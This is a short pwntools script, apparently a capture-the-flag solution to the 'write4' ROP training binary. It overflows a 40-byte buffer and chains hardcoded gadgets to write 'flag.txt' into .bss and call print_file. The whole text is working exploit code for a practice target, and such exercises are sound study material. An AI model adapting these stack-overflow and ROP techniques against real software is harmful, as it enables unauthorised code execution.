from pwn import *

bss_addr                 = 0x00404020
print_file_addr          = 0x00401040
mov_mem_r14_r15_addr     = 0x004011a6
pop_r14_pop_r15_ret_addr = 0x0040119c
pop_rdi_ret_addr         = 0x004011af

offset = 40

payload  = b"b" * offset
payload += p64(pop_r14_pop_r15_ret_addr)
payload += p64(bss_addr)
payload += b"flag.txt"
payload += p64(mov_mem_r14_r15_addr)
payload += p64(pop_rdi_ret_addr)
payload += p64(bss_addr)
payload += p64(print_file_addr)

p = process("./write4")
p.sendlineafter(b"> ", payload)
p.interactive()
